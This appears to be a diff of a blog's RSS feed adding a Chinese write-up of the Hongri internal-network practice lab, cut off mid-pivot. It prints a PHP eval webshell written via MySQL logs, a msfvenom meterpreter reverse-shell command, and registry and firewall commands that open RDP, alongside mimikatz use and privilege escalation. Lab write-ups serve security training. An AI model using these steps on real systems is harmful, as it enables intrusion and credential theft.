@@ -7,7 +7,914 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>gucheNg</copyright>
-        <lastBuildDate>Sat, 30 Nov 2024 12:56:25 +0800</lastBuildDate><atom:link href="http://gucheng.me/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sun, 08 Dec 2024 12:19:00 +0800</lastBuildDate><atom:link href="http://gucheng.me/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>红日内网靶场1</title>
+        <link>http://gucheng.me/p/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/</link>
+        <pubDate>Sun, 08 Dec 2024 12:19:00 +0800</pubDate>
+        
+        <guid>http://gucheng.me/p/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/</guid>
+        <description>&lt;h3 id=&#34;1环境搭建&#34;&gt;1.环境搭建
+&lt;/h3&gt;&lt;p&gt;参考以下文章,不做过多叙述&lt;/p&gt;
+&lt;p&gt;&amp;lt;https://blog.csdn.net/m0_46363249/article/details/121441832&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;2拓扑图和机器信息&#34;&gt;2.拓扑图和机器信息
+&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/%e7%bb%98%e5%9b%be2.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;img&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241208122350101.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241208122350101&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;3打点&#34;&gt;3.打点
+&lt;/h3&gt;&lt;p&gt;端口扫描发现80站点和3306mysql服务&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241208142541944.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241208142541944&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;访问http发现phpstudy探针&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241208142628629.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241208142628629&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;使用hydra发现无法连接&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241208142912387.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241208142912387&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;截包尝试爆破发现一个异常长度&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241208143525512.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241208143525512&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;返回包看不出什么,到web界面手动输入root,root发现连接正常说明存在弱口令root/root&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241208143542310.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241208143542310&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;尝试连接发现不允许从外部连接&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241208143801745.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241208143801745&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;掏出82年的笔记,按理说phpstudy搭建应该有phpadmin&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241208143857821.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241208143857821&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;访问路径发现的确存在&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241208143958943.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241208143958943&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;使用弱口令root/root成功进入&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241208144044408.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241208144044408&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;发现是能够执行sql语句的&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241208144514164.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241208144514164&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;接下来我们尝试利用mysql 写入webshell&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;#mysql写入webshell需要的条件
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;1.mysql用户为root或dba赋权较高用户
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;2.有写入权限(FILE)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;3.知道网站的绝对路径
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;4.服务器配置secure_file_priv
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;该选项为空代表可以写入任何目录
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;该选项如果有目录则代表只允许写入该目录下文件
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;该选项为null代表没有权限
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;查询&amp;quot;secure_file_priv&amp;quot;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241208144950595.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241208144950595&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;发现为null就是没有写入权限&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241208145019777.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241208145019777&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;查询一下日志功能,尝试利用日志getshell&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241208151454482.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241208151454482&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;关闭了但是我们可以手动开启,输入sql语句&lt;code&gt;SET GLOBAL general_log = ON;&lt;/code&gt;执行成功开启&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241208151634306.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241208151634306&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;我这里偷窥了一下站点目录,这个应该记住!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241208151917953.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241208151917953&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;接下来的思路是设置日志文件写到一个php文件中,&lt;code&gt;SET GLOBAL general_log_file = &#39;C:/phpstudy/WWW/test.php&#39;;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241208160931473.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241208160931473&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;#这里前面不能加@
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;select &amp;#39;&amp;lt;?php eval($_POST[gucheng]);?&amp;gt;&amp;#39;;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241208161435113.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241208161435113&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241208162418255.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241208162418255&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;进来后发现还有个网站yxcms,我们练习都打一下&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241208164539137.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241208164539137&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;棱洞扫了下发现这cms就叫这个&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241208165056769.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241208165056769&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;查看网页源代码发现默认口令&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241208165525343.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241208165525343&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;到指定路径输入默认口令成功登入,修改模版index_index.php&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241208170152404.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241208170152404&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;写入一句马&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241208170701742.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241208170701742&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;蚁剑成功连接&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241208170809940.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241208170809940&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;4内网渗透&#34;&gt;4.内网渗透
+&lt;/h3&gt;&lt;p&gt;之前一直内网手渗透,下面就用cs操作了,主要是内网信息收集插件方便点&lt;/p&gt;
+&lt;p&gt;将生成马上传到站点目录下运行上线&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241208184123955.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241208184123955&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;ladon插件 icmp检测主机存活一致&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241208185403956.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241208185403956&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;发现存在域环境,域名为god.org&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241208193501834.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241208193501834&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;ladon infoscan整个网段确实如此&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241208193607344.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241208193607344&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;现在是administrator权限,可以尝试提到system权限&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241208194301195.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241208194301195&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;上传个nc到c:\windows\temp目录&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241208194237316.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241208194237316&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;弹过来没反应&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241208200518356.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241208200518356&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;mimikatz抓取到密码&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241208200318243.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241208200318243&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;尝试用psexec连接也不行&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241208202630995.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241208202630995&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;查看一下系统信息,打了什么补丁&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241208202537197.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241208202537197&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;使用梼杌中的ms14-058提权成功&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241208204847821.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241208204847821&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241208202805154.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241208202805154&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;上面搞的好像是有点问题,Windows应该是3389远程桌面连接,重新搞下&lt;/p&gt;
+&lt;p&gt;执行netstat -ano未发现3389端口开启&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241209133742373.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241209133742373&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;通过以下命令查询注册表来查看 RDP 服务是否开启：
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;REG QUERY &amp;#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&amp;#34; /v fDenyTSConnections    
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;# 查看RDP服务是否开启: 1关闭, 0开启 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;REG QUERY &amp;#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\ WinStations\RDP-Tcp&amp;#34; /v PortNumber    # 查看 RDP 服务的端口
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;为1关闭&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241209135458399.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241209135458399&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;使用命令&lt;code&gt;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&amp;quot; &amp;quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&lt;/code&gt;手动开启&lt;/p&gt;
+&lt;p&gt;为0成功开启&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241209135700721.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241209135700721&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;再使用命令配置一下防火墙允许连接&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;netsh advfirewall firewall add rule name=&amp;#34;Remote Desktop&amp;#34; protocol=TCP dir=in localport=3389 action=allow
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241209141144583.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241209141144583&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;接下来可以使用kali自带的xfreerdp进行连接,我这里为了后期渗透方便选择msf的&lt;/p&gt;
+&lt;p&gt;先使用msfvenom组件生成一个马&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.52.128 lport=4444 -f exe -o /root/Desktop/shell.exe
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;传上去执行后拿到meterpreter会话&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241209143251537.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241209143251537&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241209143532781.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241209143532781&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;提权到system&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241209143942740.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241209143942740&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;run post/windows/manage/enable_rdp #开启远程桌面
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;会生成一个文件，该文件可用来 再关闭远程桌面
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;run multi_console_command -r 文件地址
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;接下来做域内信息收集准备横向&lt;/p&gt;
+&lt;p&gt;输入net view发现另外两台主机&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241209132456126.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241209132456126&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241209153323049.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241209153323049&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;汇总一下信息&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;域名:god.org
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;域控:OWA
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;域内用户三个:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Administrator
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ligang
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;liukaifeng01
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;域内主机三台:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;STU1(win7) 192.168.52.143
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;OWA 192.168.52.138
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ROOT-TVI862UBEH 192.168.52.141
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h4 id=&#34;41-使用proxychains代理&#34;&gt;4.1 使用proxychains代理:
+&lt;/h4&gt;&lt;p&gt;添加内网路由 run autoroute -s 192.168.52.0/24，查看一下arp缓存表存在52网段&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241209154407675.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241209154407675&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;background返回一下,使用socks代理模块&lt;/p&gt;
